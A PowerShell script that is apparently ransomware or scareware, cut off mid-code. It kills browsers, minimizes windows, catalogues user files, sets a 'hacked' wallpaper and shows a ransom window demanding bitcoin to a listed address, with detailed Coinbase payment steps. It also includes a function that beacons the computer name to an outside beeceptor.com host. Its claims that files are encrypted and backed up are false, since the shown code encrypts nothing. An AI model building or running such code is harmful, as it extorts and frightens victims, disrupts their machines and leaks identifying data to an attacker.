# If you're reading this, i am sorry. 

Add-Type -AssemblyName PresentationFramework,PresentationCore
Add-Type -AssemblyName System.Drawing

function Get-SystemFiles {
    $extensions = @('.heic', '.heif', '.png', '.jpg', '.jpeg', '.cr3', '.mp4', '.mov', '.mkv', 
                   '.gif', '.webp', '.tiff', '.bmp', '.svg', '.psd', '.dng', '.pdf', '.docx', 
                   '.doc', '.txt', '.rtf', '.zip', '.7zip', '.pptx', '.csv', '.xlsx', '.ppt', '.xls')
    
    $allFiles = @()
    $maxFiles = 1000
    
    
    $folders = @(
        @{Path = [Environment]::GetFolderPath("MyDocuments"); Name = "Documents"},
        @{Path = [Environment]::GetFolderPath("UserProfile") + "\Downloads"; Name = "Downloads"},
        @{Path = [Environment]::GetFolderPath("Desktop"); Name = "Desktop"}
    )
    
    foreach ($folder in $folders) {
        if ($allFiles.Count -ge $maxFiles) { break }
        
        if (Test-Path $folder.Path) {
            try {
                $files = [System.IO.Directory]::GetFiles($folder.Path, "*.*", [System.IO.SearchOption]::AllDirectories) |
                         Where-Object { $extensions -contains [System.IO.Path]::GetExtension($_).ToLower() }
                
                foreach ($file in $files) {
                    if ($allFiles.Count -ge $maxFiles) { break }
                    
                    try {
                        $fileInfo = New-Object System.IO.FileInfo($file)
                        $allFiles += [PSCustomObject]@{
                            Name = [System.IO.Path]::GetFileName($file)
                            FullPath = $file
                            Extension = [System.IO.Path]::GetExtension($file)
                            Folder = $folder.Name
                        }
                    } catch {}
                }
            } catch {}
        }
    }
    
    return $allFiles | Select-Object -First $maxFiles
}

function Hide-AllWindows {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            
            public class WindowMinimizer {
                [DllImport("user32.dll")]
                public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
                
                [DllImport("user32.dll")]
                public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
                
                private const uint WM_COMMAND = 0x0111;
                private const uint MIN_ALL = 419; // 0x1A3
                
                public static void MinimizeAllWindows() {
                    // Find the taskbar window
                    IntPtr taskbarWnd = FindWindow("Shell_TrayWnd", null);
                    if (taskbarWnd != IntPtr.Zero) {
                        // Send the "Minimize All" command
                        SendMessage(taskbarWnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
                    }
                }
            }
"@
        
        [WindowMinimizer]::MinimizeAllWindows()
        
        Start-Sleep -Milliseconds 100
        try {
            $shell = New-Object -ComObject "Shell.Application"
            $shell.MinimizeAll()
        } catch {}
        
        Start-Sleep -Milliseconds 200
        $browserProcesses = @(
            "chrome",          
            "msedge",         
            "firefox",         
            "opera"           
        )
        
        foreach ($process in $browserProcesses) {
            try {
                Get-Process -Name $process -ErrorAction SilentlyContinue | Stop-Process -Force
                Start-Sleep -Milliseconds 50
            } catch {
                 
            }
        }
        
    } catch {
        
        try {
            $shell = New-Object -ComObject "Shell.Application"
            $shell.MinimizeAll()
        } catch {}
    }
}
function pingx {
    try {
         $computerName = $env:COMPUTERNAME
        $webClient = New-Object System.Net.WebClient
       
        $signalBytes = $webClient.DownloadData("https://ig49hsdihfeishkdjhfes.free.beeceptor.com/?msg=$computerName")
        
    } catch {
        
    }
}

function Show-BitcoinInstructions {
    $instructionsWindow = New-Object System.Windows.Window
    $instructionsWindow.Title = "How to Buy and Send Bitcoin"
    $instructionsWindow.Width = 700
    $instructionsWindow.Height = 800
    $instructionsWindow.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen
    $instructionsWindow.Topmost = $true
    
    $scrollViewer = New-Object System.Windows.Controls.ScrollViewer
    $scrollViewer.VerticalScrollBarVisibility = 'Auto'
    
    $stackPanel = New-Object System.Windows.Controls.StackPanel
    $stackPanel.Margin = '20,20,20,20'
    
  
    $title = New-Object System.Windows.Controls.TextBlock
    $title.Text = "HOW TO BUY AND SEND BITCOIN"
    $title.FontSize = 24
    $title.FontWeight = [System.Windows.FontWeights]::Bold
    $title.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $title.Margin = '0,0,0,20'
    $title.HorizontalAlignment = 'Center'
    $stackPanel.Children.Add($title)
    
   
    $infoSection = New-Object System.Windows.Controls.Border
    $infoSection.Background = [System.Windows.Media.Brushes]::LightYellow
    $infoSection.BorderBrush = [System.Windows.Media.Brushes]::Goldenrod
    $infoSection.BorderThickness = '1,1,1,1'
    $infoSection.CornerRadius = '5,5,5,5'
    $infoSection.Padding = '15,15,15,15'
    $infoSection.Margin = '0,0,0,20'
    
    $infoText = New-Object System.Windows.Controls.TextBlock
    $infoText.Text = "These instructions guide you to buy BITCOIN with COINBASE.COM. If Coinbase is not available in your country, search online for 'how to buy bitcoin' tutorial videos. Other recommended platforms: Kraken.com, Moonpay.com."
    $infoText.FontSize = 12
    $infoText.TextWrapping = 'Wrap'
    $infoSection.Child = $infoText
    $stackPanel.Children.Add($infoSection)

 
    $assuranceSection = New-Object System.Windows.Controls.Border
    $assuranceSection.Background = [System.Windows.Media.Brushes]::LightBlue
    $assuranceSection.BorderBrush = [System.Windows.Media.Brushes]::RoyalBlue
    $assuranceSection.BorderThickness = '2,2,2,2'
    $assuranceSection.CornerRadius = '5,5,5,5'
    $assuranceSection.Padding = '15,15,15,15'
    $assuranceSection.Margin = '0,0,0,20'

    $assuranceGrid = New-Object System.Windows.Controls.Grid
    $col1 = New-Object System.Windows.Controls.ColumnDefinition
    $col1.Width = 'Auto'
    $col2 = New-Object System.Windows.Controls.ColumnDefinition
    $col2.Width = '*'
    $assuranceGrid.ColumnDefinitions.Add($col1)
    $assuranceGrid.ColumnDefinitions.Add($col2)

    
    $assuranceIcon = New-Object System.Windows.Controls.TextBlock
    $assuranceIcon.Text = "✅"
    $assuranceIcon.FontSize = 24
    $assuranceIcon.Margin = '0,0,10,0'
    $assuranceIcon.VerticalAlignment = 'Top'
    [System.Windows.Controls.Grid]::SetColumn($assuranceIcon, 0)

    
    $assuranceText = New-Object System.Windows.Controls.TextBlock
    $assuranceText.Text = "GUARANTEE: Once Bitcoin payment is received and confirmed, your files will be automatically decrypted and full system access will be restored immediately. We have a 100% track record of restoring access for users who pay the ransom."
    $assuranceText.FontSize = 12
    $assuranceText.FontWeight = [System.Windows.FontWeights]::Bold
    $assuranceText.TextWrapping = 'Wrap'
    $assuranceText.Foreground = [System.Windows.Media.Brushes]::DarkBlue
    [System.Windows.Controls.Grid]::SetColumn($assuranceText, 1)

    $assuranceGrid.Children.Add($assuranceIcon)
    $assuranceGrid.Children.Add($assuranceText)
    $assuranceSection.Child = $assuranceGrid
    $stackPanel.Children.Add($assuranceSection)
    
    
    $needsHeader = New-Object System.Windows.Controls.TextBlock
    $needsHeader.Text = "WHAT YOU WILL NEED:"
    $needsHeader.FontSize = 16
    $needsHeader.FontWeight = [System.Windows.FontWeights]::Bold
    $needsHeader.Margin = '0,0,0,10'
    $stackPanel.Children.Add($needsHeader)
    
    $needsList = New-Object System.Windows.Controls.StackPanel
    $needsList.Margin = '20,0,0,20'
    
    $need1 = New-Object System.Windows.Controls.TextBlock
    $need1.Text = "1. Your mobile phone or computer"
    $need1.FontSize = 13
    $need1.Margin = '0,0,0,5'
    
    $need2 = New-Object System.Windows.Controls.TextBlock
    $need2.Text = "2. Government-issued photo ID (driver's license or passport)"
    $need2.FontSize = 13
    
    $needsList.Children.Add($need1)
    $needsList.Children.Add($need2)
    $stackPanel.Children.Add($needsList)
    
    
    $step1Header = New-Object System.Windows.Controls.TextBlock
    $step1Header.Text = "STEP 1: Download App or Visit Website"
    $step1Header.FontSize = 16
    $step1Header.FontWeight = [System.Windows.FontWeights]::Bold
    $step1Header.Margin = '0,0,0,10'
    $stackPanel.Children.Add($step1Header)
    
    $step1Content = New-Object System.Windows.Controls.TextBlock
    $step1Content.Text = "Download the 'Coinbase' application from the App Store (iOS) or Google Play Store (Android), or visit www.coinbase.com in your web browser. If you use the website instead of the app, some instructions may differ slightly."
    $step1Content.FontSize = 12
    $step1Content.TextWrapping = 'Wrap'
    $step1Content.Margin = '0,0,0,20'
    $stackPanel.Children.Add($step1Content)
    
    
    $step2Header = New-Object System.Windows.Controls.TextBlock
    $step2Header.Text = "STEP 2: Create Your Account"
    $step2Header.FontSize = 16
    $step2Header.FontWeight = [System.Windows.FontWeights]::Bold
    $step2Header.Margin = '0,0,0,10'
    $stackPanel.Children.Add($step2Header)
    
    $step2List = New-Object System.Windows.Controls.StackPanel
    $step2List.Margin = '20,0,0,20'
    
    $step2Item1 = New-Object System.Windows.Controls.TextBlock
    $step2Item1.Text = "• Click 'Sign Up' to create a new account"
    $step2Item1.FontSize = 12
    $step2Item1.Margin = '0,0,0,3'
    
    $step2Item2 = New-Object System.Windows.Controls.TextBlock
    $step2Item2.Text = "• Enter your email address and verify with the code sent to you"
    $step2Item2.FontSize = 12
    $step2Item2.Margin = '0,0,0,3'
    
    $step2Item3 = New-Object System.Windows.Controls.TextBlock
    $step2Item3.Text = "• Create a secure password"
    $step2Item3.FontSize = 12
    $step2Item3.Margin = '0,0,0,3'
    
    $step2Item4 = New-Object System.Windows.Controls.TextBlock
    $step2Item4.Text = "• Enter your first and last name"
    $step2Item4.FontSize = 12
    $step2Item4.Margin = '0,0,0,3'
    
    $step2Item5 = New-Object System.Windows.Controls.TextBlock
    $step2Item5.Text = "• Enter your phone number and verify with the code sent via SMS"
    $step2Item5.FontSize = 12
    $step2Item5.Margin = '0,0,0,3'
    
    $step2List.Children.Add($step2Item1)
    $step2List.Children.Add($step2Item2)
    $step2List.Children.Add($step2Item3)
    $step2List.Children.Add($step2Item4)
    $step2List.Children.Add($step2Item5)
    $stackPanel.Children.Add($step2List)
    
    
    $step3Header = New-Object System.Windows.Controls.TextBlock
    $step3Header.Text = "STEP 3: Identity Verification"
    $step3Header.FontSize = 16
    $step3Header.FontWeight = [System.Windows.FontWeights]::Bold
    $step3Header.Margin = '0,0,0,10'
    $stackPanel.Children.Add($step3Header)
    
    $step3Content = New-Object System.Windows.Controls.TextBlock
    $step3Content.Text = "Follow the on-screen instructions to complete the identity verification process. You will need to take photos of your ID document and possibly a selfie."
    $step3Content.FontSize = 12
    $step3Content.TextWrapping = 'Wrap'
    $step3Content.Margin = '0,0,0,20'
    $stackPanel.Children.Add($step3Content)
    
    
    $step4Header = New-Object System.Windows.Controls.TextBlock
    $step4Header.Text = "STEP 4: Payment Method"
    $step4Header.FontSize = 16
    $step4Header.FontWeight = [System.Windows.FontWeights]::Bold
    $step4Header.Margin = '0,0,0,10'
    $stackPanel.Children.Add($step4Header)
    
    $step4List = New-Object System.Windows.Controls.StackPanel
    $step4List.Margin = '20,0,0,20'
    
    $step4Item1 = New-Object System.Windows.Controls.TextBlock
    $step4Item1.Text = "• Once your account is set up, click the menu button in the top left"
    $step4Item1.FontSize = 12
    $step4Item1.Margin = '0,0,0,3'
    
    $step4Item2 = New-Object System.Windows.Controls.TextBlock
    $step4Item2.Text = "• Select your name"
    $step4Item2.FontSize = 12
    $step4Item2.Margin = '0,0,0,3'
    
    $step4Item3 = New-Object System.Windows.Controls.TextBlock
    $step4Item3.Text = "• Select 'Payment Method'"
    $step4Item3.FontSize = 12
    $step4Item3.Margin = '0,0,0,3'
    
    $step4Item4 = New-Object System.Windows.Controls.TextBlock
    $step4Item4.Text = "• IMPORTANT: You must choose between credit/debit or link your bank account. Any other payment method will hold your transfer for several days, and you will lose access to your files!"
    $step4Item4.FontSize = 12
    $step4Item4.FontWeight = [System.Windows.FontWeights]::Bold
    $step4Item4.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $step4Item4.Margin = '0,0,0,3'
    $step4Item4.TextWrapping = 'Wrap'
    
    $step4List.Children.Add($step4Item1)
    $step4List.Children.Add($step4Item2)
    $step4List.Children.Add($step4Item3)
    $step4List.Children.Add($step4Item4)
    $stackPanel.Children.Add($step4List)
    
    
    $step5Header = New-Object System.Windows.Controls.TextBlock
    $step5Header.Text = "STEP 4: Sending Bitcoin"
    $step5Header.FontSize = 16
    $step5Header.FontWeight = [System.Windows.FontWeights]::Bold
    $step5Header.Margin = '0,0,0,10'
    $stackPanel.Children.Add($step5Header)
    
    $step5List = New-Object System.Windows.Controls.StackPanel
    $step5List.Margin = '20,0,0,20'
    
    $step5Item1 = New-Object System.Windows.Controls.TextBlock
    $step5Item1.Text = "• Once you have added a payment method, navigate to the 'Pay' page and select the square QR code icon`n in the top right"
    $step5Item1.FontSize = 12
    $step5Item1.Margin = '0,0,0,3'
    
    $step5Item2 = New-Object System.Windows.Controls.TextBlock
    $step5Item2.Text = "• Scan the QR code displayed in the red window on your computer screen (if your screen turns black restart the app, return to pay page and skip this step)"
    $step5Item2.FontSize = 12
    $step5Item2.Margin = '0,0,0,3'
    $step5Item2.TextWrapping = 'Wrap'
    
    $step5Item3 = New-Object System.Windows.Controls.TextBlock
    $step5Item3.Text = "• Make sure you Select Bitcoin (BTC)"
    $step5Item3.FontSize = 12
    $step5Item3.Margin = '0,0,0,3'
    
    $step5Item4 = New-Object System.Windows.Controls.TextBlock
    $step5Item4.Text = "• Click the '0 BTC' icon under the amount field to switch to BTC (not your local currency)"
    $step5Item4.FontSize = 12
    $step5Item4.Margin = '0,0,0,3'
    
    $step5Item5 = New-Object System.Windows.Controls.TextBlock
    $step5Item5.Text = "• The amount field should say '0 BTC'. If it does not say BTC, you did it wrong."
    $step5Item5.FontSize = 12
    $step5Item5.Margin = '0,0,0,3'
    $step5Item5.FontStyle = 'Italic'
    
    $step5Item6 = New-Object System.Windows.Controls.TextBlock
    $step5Item6.Text = "• ENTER EXACT AMOUNT: 0.0023 BTC"
    $step5Item6.FontSize = 12
    $step5Item6.FontWeight = [System.Windows.FontWeights]::Bold
    $step5Item6.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $step5Item6.Margin = '0,0,0,3'
    
    $step5Item7 = New-Object System.Windows.Controls.TextBlock
    $step5Item7.Text = "• Click 'Pay'"
    $step5Item7.FontSize = 12
    $step5Item7.Margin = '0,0,0,3'
    
    $step5Item8 = New-Object System.Windows.Controls.TextBlock
    $step5item8.FontFamily = "Cascadia Code"
    $step5Item8.Text = "• If QR code didn't work, manually enter the bitcoin address: bc1q3z7uwz8p5lpwk0wnz5aj2xyszs9fty5s97xm7u"
    $step5Item8.FontSize = 12
    $step5Item8.Margin = '0,0,0,3'
    $step5Item8.TextWrapping = 'Wrap'
    
    $step5Item9 = New-Object System.Windows.Controls.TextBlock
    $step5Item9.Text = "• IMPORTANT: ENSURE YOU ENTER THE ADDRESS EXACTLY AS DISPLAYED - if any character is wrong, payment will not be received."
    $step5Item9.FontSize = 12
    $step5Item9.FontWeight = [System.Windows.FontWeights]::Bold
    $step5Item9.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $step5Item9.Margin = '0,0,0,3'
    $step5Item9.TextWrapping = 'Wrap'
    
    $step5Item10 = New-Object System.Windows.Controls.TextBlock
    $step5Item10.Text = "• A single result should show up once you are done typing out address. Select it."
    $step5Item10.FontSize = 12
    $step5Item10.Margin = '0,0,0,3'
    
    $step5Item11 = New-Object System.Windows.Controls.TextBlock
    $step5Item11.Text = "• If asked between Self-custody wallet or Exchange, select 'Self-custody'."
    $step5Item11.FontSize = 12
    $step5Item11.Margin = '0,0,0,3'
    
    $step5Item12 = New-Object System.Windows.Controls.TextBlock
    $step5Item12.Text = "• Select Pay Now."
    $step5Item12.FontSize = 12
    $step5Item12.Margin = '0,0,0,3'
    
    $step5List.Children.Add($step5Item1)
    $step5List.Children.Add($step5Item2)
    $step5List.Children.Add($step5Item3)
    $step5List.Children.Add($step5Item4)
    $step5List.Children.Add($step5Item5)
    $step5List.Children.Add($step5Item6)
    $step5List.Children.Add($step5Item7)
    $step5List.Children.Add($step5Item8)
    $step5List.Children.Add($step5Item9)
    $step5List.Children.Add($step5Item10)
    $step5List.Children.Add($step5Item11)
    $step5List.Children.Add($step5Item12)
    $stackPanel.Children.Add($step5List)
    
    
    $finalWarning = New-Object System.Windows.Controls.TextBlock
    $finalWarning.Text = "IMPORTANT: If you are having trouble with any of these steps, search online for help. If payment is not received within 3 days, your files will be sold online and permanently deleted from your device."
    $finalWarning.FontSize = 12
    $finalWarning.FontWeight = [System.Windows.FontWeights]::Bold
    $finalWarning.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $finalWarning.TextWrapping = 'Wrap'
    $finalWarning.Margin = '0,0,0,20'
    $stackPanel.Children.Add($finalWarning)
    
    
    $closeButton = New-Object System.Windows.Controls.Button
    $closeButton.Content = "Close Instructions"
    $closeButton.Width = 150
    $closeButton.Height = 30
    $closeButton.HorizontalAlignment = 'Center'
    $closeButton.Add_Click({
        $instructionsWindow.Close()
    })
    $stackPanel.Children.Add($closeButton)
    
    $scrollViewer.Content = $stackPanel
    $instructionsWindow.Content = $scrollViewer
    $instructionsWindow.ShowDialog() | Out-Null
}

function Set-RansomWallpaper {
    $width = [System.Windows.SystemParameters]::PrimaryScreenWidth
    $height = [System.Windows.SystemParameters]::PrimaryScreenHeight
    
    $bitmap = New-Object System.Drawing.Bitmap([int]$width, [int]$height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    
    
    $graphics.Clear([System.Drawing.Color]::FromArgb(255, 200, 0, 0))
    
    
    $font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
    $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    
    $text = "您的電腦已被駭客入侵。"
    $textSize = $graphics.MeasureString($text, $font)
    $x = ($width - $textSize.Width) / 2
    $y = ($height - $textSize.Height) / 2
    
    $graphics.DrawString($text, $font, $brush, $x, $y)
    
    
    $wallpaperPath = "$env:TEMP\hacked_wallpaper.bmp"
    $bitmap.Save($wallpaperPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
    
    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 0x01 -bor 0x02)
    
   
    $brush.Dispose()
    $font.Dispose()
    $graphics.Dispose()
    $bitmap.Dispose()
}


function Kill-Explorer {
    try {
         cmd /c "taskkill /F /IM explorer.exe"
    } catch {}
}


Hide-AllWindows


Set-RansomWallpaper




$systemFiles = Get-SystemFiles



$w = New-Object System.Windows.Window
$w.Title = "WNC Computer Lockdown - 你完蛋了"
$w.Width = 1200
$w.Height = 900
$w.Topmost = $true
$w.WindowStyle = [System.Windows.WindowStyle]::SingleBorderWindow
$w.ResizeMode = [System.Windows.ResizeMode]::NoResize
$w.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen

$g = New-Object System.Windows.Controls.Grid
$g.Background = [System.Windows.Media.Brushes]::DarkRed


$col1 = New-Object System.Windows.Controls.ColumnDefinition
$col1.Width = New-Object System.Windows.GridLength(1, 'Star')
$col2 = New-Object System.Windows.Controls.ColumnDefinition
$col2.Width = New-Object System.Windows.GridLength(400)
$g.ColumnDefinitions.Add($col1)
$g.ColumnDefinitions.Add($col2)

$title = New-Object System.Windows.Controls.TextBlock
$title.Text = "⚠️ Ooops, Your Files Have Been Encrypted"
$title.Foreground = [System.Windows.Media.Brushes]::White
$title.FontFamily = 'Segoe UI'
$title.FontSize = 28
$title.FontWeight = [System.Windows.FontWeights]::Bold
$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$title.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
$title.Margin = '15,12,0,0'
$title.TextWrapping = [System.Windows.TextWrapping]::Wrap
[System.Windows.Controls.Grid]::SetColumnSpan($title, 2)
[System.Windows.Controls.Grid]::SetColumn($title, 0)

$b = New-Object System.Windows.Controls.Border
$b.Height = 3
$b.Margin = '0,52,0,0'
$b.Background = [System.Windows.Media.Brushes]::Red
$b.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Stretch
$b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
[System.Windows.Controls.Grid]::SetColumnSpan($b, 2)
[System.Windows.Controls.Grid]::SetColumn($b, 0)


$leftScroll = New-Object System.Windows.Controls.ScrollViewer
$leftScroll.VerticalScrollBarVisibility = 'Auto'
$leftScroll.Margin = '15,70,15,20'
[System.Windows.Controls.Grid]::SetColumn($leftScroll, 0)

$leftContainer = New-Object System.Windows.Controls.StackPanel
$leftContainer.Orientation = 'Vertical'
$leftContainer.Margin = '0,0,0,0'


$section1 = New-Object System.Windows.Controls.Border
$section1.Background = [System.Windows.Media.Brushes]::Black
$section1.CornerRadius = '5,5,5,5'
$section1.BorderBrush = [System.Windows.Media.Brushes]::Gray
$section1.BorderThickness = '1,1,1,1'
$section1.Margin = '0,0,0,15'
$section1.Padding = '15,15,15,15'

$section1Grid = New-Object System.Windows.Controls.Grid
$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
$section1Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
$section1Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
$section1Grid.Margin = '0,0,0,0'


$warningIcon1 = New-Object System.Windows.Controls.TextBlock
$warningIcon1.Text = "🔒"
$warningIcon1.FontSize = 24
$warningIcon1.Foreground = [System.Windows.Media.Brushes]::Red
$warningIcon1.VerticalAlignment = 'Top'
$warningIcon1.Margin = '0,0,10,0'
[System.Windows.Controls.Grid]::SetColumn($warningIcon1, 0)
[System.Windows.Controls.Grid]::SetRow($warningIcon1, 0)


$section1Title = New-Object System.Windows.Controls.TextBlock
$section1Title.Text = "SYSTEM ENCRYPTION"
$section1Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
$section1Title.FontFamily = 'Segoe UI'
$section1Title.FontSize = 18
$section1Title.FontWeight = [System.Windows.FontWeights]::Bold
$section1Title.VerticalAlignment = 'Center'
[System.Windows.Controls.Grid]::SetColumn($section1Title, 1)
[System.Windows.Controls.Grid]::SetRow($section1Title, 0)

$section1Content = New-Object System.Windows.Controls.TextBlock
$section1Content.Text = "Your documents, photos, videos, and important files have been encrypted using military-grade AES-256 encryption. They are no longer accessible without the decryption key. Any attempt to remove this software, restart your computer, or seek external help will trigger immediate permanent file deletion."
$section1Content.Foreground = [System.Windows.Media.Brushes]::White
$section1Content.FontFamily = 'Segoe UI'
$section1Content.FontSize = 13
$section1Content.TextWrapping = 'Wrap'
$section1Content.Margin = '0,10,0,0'
[System.Windows.Controls.Grid]::SetColumn($section1Content, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($section1Content, 2)
[System.Windows.Controls.Grid]::SetRow($section1Content, 1)

$section1Grid.Children.Add($warningIcon1)
$section1Grid.Children.Add($section1Title)
$section1Grid.Children.Add($section1Content)
$section1.Child = $section1Grid

$section2 = New-Object System.Windows.Controls.Border
$section2.Background = [System.Windows.Media.Brushes]::Black
$section2.CornerRadius = '5,5,5,5'
$section2.BorderBrush = [System.Windows.Media.Brushes]::Gray
$section2.BorderThickness = '1,1,1,1'
$section2.Margin = '0,0,0,15'
$section2.Padding = '15,15,15,15'

$section2Grid = New-Object System.Windows.Controls.Grid
$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = 'Auto'}))
$section2Grid.ColumnDefinitions.Add((New-Object System.Windows.Controls.ColumnDefinition -Property @{Width = '*'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = '*'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))
$section2Grid.RowDefinitions.Add((New-Object System.Windows.Controls.RowDefinition -Property @{Height = 'Auto'}))

$recoveryIcon = New-Object System.Windows.Controls.TextBlock
$recoveryIcon.Text = "💰"
$recoveryIcon.FontSize = 24
$recoveryIcon.Foreground = [System.Windows.Media.Brushes]::Gold
$recoveryIcon.VerticalAlignment = 'Top'
$recoveryIcon.Margin = '0,0,10,0'
[System.Windows.Controls.Grid]::SetColumn($recoveryIcon, 0)
[System.Windows.Controls.Grid]::SetRow($recoveryIcon, 0)

$section2Title = New-Object System.Windows.Controls.TextBlock
$section2Title.Text = "FILE RECOVERY PROCESS"
$section2Title.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue
$section2Title.FontFamily = 'Segoe UI'
$section2Title.FontSize = 18
$section2Title.FontWeight = [System.Windows.FontWeights]::Bold
$section2Title.VerticalAlignment = 'Center'
[System.Windows.Controls.Grid]::SetColumn($section2Title, 1)
[System.Windows.Controls.Grid]::SetRow($section2Title, 0)

$section2Content = New-Object System.Windows.Controls.TextBlock
$section2Content.Text = "We guarantee 100% file recovery upon payment. Your files have been backed up to our secure servers. For more information click the 'How to Buy Bitcoins' button below. Failure to pay within 3 days will result in:"
$section2Content.Foreground = [System.Windows.Media.Brushes]::White
$section2Content.FontFamily = 'Segoe UI'
$section2Content.FontSize = 13
$section2Content.TextWrapping = 'Wrap'
$section2Content.Margin = '0,10,0,10'
[System.Windows.Controls.Grid]::SetColumn($section2Content, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($section2Content, 2)
[System.Windows.Controls.Grid]::SetRow($section2Content, 1)

$bitcoinButton = New-Object System.Windows.Controls.Button
$bitcoinButton.Content = "How to Buy Bitcoins"
$bitcoinButton.Width = 180
$bitcoinButton.Height = 30
$bitcoinButton.Background = [System.Windows.Media.Brushes]::DarkGoldenrod
$bitcoinButton.Foreground = [System.Windows.Media.Brushes]::White
$bitcoinButton.FontWeight = [System.Windows.FontWeights]::Bold
$bitcoinButton.Margin = '0,0,0,10'
$bitcoinButton.HorizontalAlignment = 'Left'
$bitcoinButton.Add_Click({
    Show-BitcoinInstructions
})
[System.Windows.Controls.Grid]::SetColumn($bitcoinButton, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($bitcoinButton, 2)
[System.Windows.Controls.Grid]::SetRow($bitcoinButton, 2)

$consequencesGrid = New-Object System.Windows.Controls.StackPanel
$consequencesGrid.Orientation = 'Vertical'
$consequencesGrid.Margin = '25,0,0,0'

$conseq1 = New-Object System.Windows.Controls.TextBlock
$conseq1.Text = "• Price doubles to `$300 USD"
$conseq1.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq1.FontSize = 12
$conseq1.FontWeight = 'Bold'

$conseq2 = New-Object System.Windows.Controls.TextBlock
$conseq2.Text = "• Your files will be published online"
$conseq2.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq2.FontSize = 12
$conseq2.FontWeight = 'Bold'

$conseq3 = New-Object System.Windows.Controls.TextBlock
$conseq3.Text = "• All files permanently deleted after 48 hours"
$conseq3.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$conseq3.FontSize = 12
$conseq3.FontWeight = 'Bold'

$consequencesGrid.Children.Add($conseq1)
$consequencesGrid.Children.Add($conseq2)
$consequencesGrid.Children.Add($conseq3)

[System.Windows.Controls.Grid]::SetColumn($consequencesGrid, 0)
[System.Windows.Controls.Grid]::SetColumnSpan($consequencesGrid, 2)
[System.Windows.Controls.Grid]::SetRow($consequencesGrid, 3)

$section2Grid.Children.Add($recoveryIcon)
$section2Grid.Children.Add($section2Title)
$section2Grid.Children.Add($section2Content)
$section2Grid.Children.Add($bitcoinButton)
$section2Grid.Children.Add($consequencesGrid)
$section2.Child = $section2Grid

$paymentPanel = New-Object System.Windows.Controls.Border
$paymentPanel.Background = [System.Windows.Media.Brushes]::Black
$paymentPanel.CornerRadius = '5,5,5,5'
$paymentPanel.BorderBrush = [System.Windows.Media.Brushes]::Gold
$paymentPanel.BorderThickness = '2,2,2,2'
$paymentPanel.Margin = '0,0,0,15'
$paymentPanel.Padding = '20,20,20,20'

$paymentStack = New-Object System.Windows.Controls.StackPanel
$paymentStack.Orientation = 'Vertical'
$paymentStack.HorizontalAlignment = 'Center'

$paymentTitle = New-Object System.Windows.Controls.TextBlock
$paymentTitle.Text = "BITCOIN PAYMENT REQUIRED - DUE IN 3 DAYS"
$paymentTitle.Foreground = [System.Windows.Media.Brushes]::Gold
$paymentTitle.FontFamily = 'Segoe UI'
$paymentTitle.FontSize = 22
$paymentTitle.FontWeight = [System.Windows.FontWeights]::Bold
$paymentTitle.HorizontalAlignment = 'Center'
$paymentTitle.Margin = '0,0,0,10'

$amountDisplay = New-Object System.Windows.Controls.TextBlock
$amountDisplay.Text = "`$150 USD (0.0023 BTC)"
$amountDisplay.Foreground = [System.Windows.Media.Brushes]::White
$amountDisplay.Background = [System.Windows.Media.Brushes]::DarkRed
$amountDisplay.FontFamily = 'Segoe UI'
$amountDisplay.FontSize = 18
$amountDisplay.FontWeight = [System.Windows.FontWeights]::Bold
$amountDisplay.HorizontalAlignment = 'Center'
$amountDisplay.Padding = '10,5,10,5'
$amountDisplay.Margin = '0,0,0,15'

$qrSection = New-Object System.Windows.Controls.Border
$qrSection.Background = [System.Windows.Media.Brushes]::White
$qrSection.BorderBrush = [System.Windows.Media.Brushes]::Gray
$qrSection.BorderThickness = '2,2,2,2'
$qrSection.Padding = '15,15,15,15'
$qrSection.Margin = '0,0,0,15'
$qrSection.HorizontalAlignment = 'Center'

$qrGrid = New-Object System.Windows.Controls.Grid
$qrGrid.Width = 250
$qrGrid.Height = 250

try {
    $webClient = New-Object System.Net.WebClient
    $qrBytes = $webClient.DownloadData("https://i.ibb.co/JFSDhQBH/qr-final.jpg")
